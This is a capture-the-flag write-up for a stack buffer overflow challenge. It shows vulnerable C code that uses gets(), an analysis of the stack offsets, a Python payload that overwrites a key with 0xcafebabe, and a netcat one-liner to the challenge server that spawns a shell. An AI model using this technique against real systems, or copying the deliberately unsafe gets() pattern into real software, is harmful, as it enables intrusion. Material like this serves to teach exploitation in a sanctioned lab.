### Task

The challenge involves exploiting a buffer overflow vulnerability in the provided C code. The goal is to overwrite the `key` variable in the `func` function to `0xcafebabe` to spawn a shell.

### Original Code

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void func(int key) {
    char overflowme[32];
    printf("overflow me : ");
    gets(overflowme);  // Vulnerable function
    if (key == 0xcafebabe) {
        system("/bin/sh");
    } else {
        printf("Nah..\n");
    }
}

int main(int argc, char* argv[]) {
    func(0xdeadbeef);
    return 0;
}
```

### Analysis

1. **Buffer Overflow Vulnerability**:
   - The `gets` function is used to read input into the `overflowme` buffer. Since this function does not perform bounds checking, we can input more characters thus making it vulnerable to buffer overflow attacks.
   - The `overflowme` buffer is 32 bytes long.

2. **Key Overwrite**:
   - The `key` parameter is located on the stack, and its value is compared to `0xcafebabe`.
   - If the comparison succeeds, a shell is spawned via `system("/bin/sh")`.

3. **Stack Layout**:
   - The `overflowme` buffer is at `ebp-0x2c` (44 bytes below the base pointer).
   - The `key` parameter is at `ebp+0x8` (8 bytes above the base pointer).
   - The distance between `overflowme` and `key` is 52 bytes (`0x2c + 0x8`).

### Exploit

To exploit this vulnerability, we need to:
1. Fill the `overflowme` buffer with 32 bytes of padding.
2. Overwrite the space between `overflowme` and `key` with 20 bytes of padding (to reach `ebp+0x8`).
3. Overwrite the `key` with `0xcafebabe` in little-endian format (`\xbe\xba\xfe\xca`).

The payload will consist of:
- **52 bytes of padding** (32 bytes for `overflowme` + 20 bytes to reach `key`).
- **4 bytes** representing `0xcafebabe` (`\xbe\xba\xfe\xca`).

Here’s the Python script to generate the payload:

```python
import sys

# 52 bytes of padding + 0xcafebabe in little-endian
payload = b'A' * 52 + b'\xbe\xba\xfe\xca'

# Write the payload to stdout
sys.stdout.buffer.write(payload + b'\n')
```

### Final Command

To exploit the binary, pipe the payload into the `nc` command and use `cat` to maintain the connection and retrieve the flag:

```bash
(python3 -c "import sys; sys.stdout.buffer.write(b'A' * 52 + b'\xbe\xba\xfe\xca' + b'\n')"; cat) | nc pwnable.kr 9000
```

After running the command, execute `cat flag` to retrieve the flag.
